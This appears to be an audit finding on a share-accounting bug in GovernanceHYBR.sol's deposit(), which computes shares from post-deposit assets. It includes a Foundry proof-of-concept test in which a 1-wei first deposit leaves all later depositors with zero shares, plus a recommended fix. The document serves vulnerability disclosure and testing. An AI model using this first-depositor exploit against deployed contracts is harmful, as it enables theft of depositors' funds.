  "body": "## Finding description and impact\n\nIn ve33/contracts/GovernanceHYBR.sol, `deposit()` locks the incoming HYBR into the veNFT first and then calculates gHYBR shares. `calculateShares` reads `totalAssets` after it already includes the new deposit. The effective formula becomes `shares = amount * totalSupply / (assets_before + amount)`. This inflates the denominator with the depositor’s own funds and causes minting less shares than expected.\n\nIn the extreme case, a first 1 wei seed creates totalSupply = 1 and totalAssets = 1. For any later deposit of amount > 0, the minted shares are `floor(amount * 1 / (1 + amount)) = 0`, since the denominator strictly exceeds the numerator. More generally, depositors mint fewer shares than the correct pre-deposit pro-rata amount, causing a short-mint and value transfer to existing holders. Worst case, deposits mint 0 shares.\n\nThe PoC `test_gHybr_DepositPostAssetAccounting_DonatesFunds` demonstrates the extreme case and shows that three subsequent deposits each mint zero shares; the PoC has no output and succeeds when it passes all assertions. To run it: `forge test --match-test DepositPostAssetAccounting_DonatesFunds -vvv`\n\n## Recommended mitigation steps\n\nCompute shares from a pre-deposit snapshot of totalSupply and totalAssets, before moving or locking the new amount. Then lock the funds and mint the precomputed shares.",
  "proof_of_concept": "function test_gHybr_DepositPostAssetAccounting_DonatesFunds() external {\n        address alice = address(0xA11CE);\n        address bob = address(0xB0B);\n        address carol = address(0xCAFE);\n        address dave = address(0xD00D);\n\n        uint256 aliceAmt = 1; // 1 wei\n        uint256 bobAmt = 1e18; // large amount\n        uint256 carolAmt = 5e18; // another large amount\n        uint256 daveAmt = 123_456_789; // arbitrary amount\n\n        // Fund users from deployer.\n        hybr.transfer(alice, aliceAmt);\n        hybr.transfer(bob, bobAmt);\n        hybr.transfer(carol, carolAmt);\n        hybr.transfer(dave, daveAmt);\n\n        // Alice approves and deposits 1 wei: initializes ve and mints 1 share.\n        vm.startPrank(alice);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(aliceAmt, alice);\n        vm.stopPrank();\n\n        assertEq(gHybr.totalSupply(), 1, \"First deposit should mint 1 share.\");\n        assertEq(gHybr.totalAssets(), 1, \"Assets should equal 1 after first deposit.\");\n\n        // Bob approves and deposits a large amount.\n        // Current code locks funds first, then computes shares from post-deposit assets,\n        // leading to shares = floor(bobAmt * 1 / (1 + bobAmt)) = 0.\n        vm.startPrank(bob);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(bobAmt, bob);\n        vm.stopPrank();\n\n        // Carol approves and deposits: shares = 0 as well.\n        vm.startPrank(carol);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(carolAmt, carol);\n        vm.stopPrank();\n\n        // Dave approves and deposits: shares = 0 as well.\n        vm.startPrank(dave);\n        hybr.approve(address(gHybr), type(uint256).max);\n        gHybr.deposit(daveAmt, dave);\n        vm.stopPrank();\n\n        // Bob, Carol and Dave receive zero shares.\n        assertEq(gHybr.balanceOf(bob), 0, \"Bob should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(carol), 0, \"Carol should receive 0 shares.\");\n        assertEq(gHybr.balanceOf(dave), 0, \"Dave should receive 0 shares.\");\n\n        // Supply stays 1; Alice captures all value; assets include all deposits.\n        assertEq(gHybr.totalSupply(), 1, \"Total supply must remain 1.\");\n        assertEq(gHybr.balanceOf(alice), gHybr.totalSupply(), \"Alice captured all value.\");\n        assertEq(gHybr.totalAssets(), aliceAmt + bobAmt + carolAmt + daveAmt, \"Assets should include all deposits.\");\n    }",
